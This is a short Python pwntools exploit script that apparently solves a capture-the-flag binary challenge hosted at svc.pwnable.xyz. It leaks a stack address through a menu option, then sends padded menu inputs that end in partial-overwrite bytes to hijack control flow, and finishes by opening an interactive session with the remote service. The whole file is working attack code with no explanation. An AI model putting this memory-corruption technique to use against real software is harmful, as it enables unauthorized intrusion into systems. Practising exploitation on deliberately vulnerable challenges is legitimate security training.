#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30012)
# context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000


def menu(idx):
    io.recvuntil('> ')
    io.send(str(idx))



# leak stack
menu(3)
stack_addr = int(io.recvuntil("\n")[:-1], 16)
log.info("\033[33m" + hex(stack_addr) + "\033[0m")


menu('119aaaaa' + 'a' * 0x18 + '\x49')
menu('1aaaaaaa' + 'b' * 0x18 + '\x40')
io.interactive()
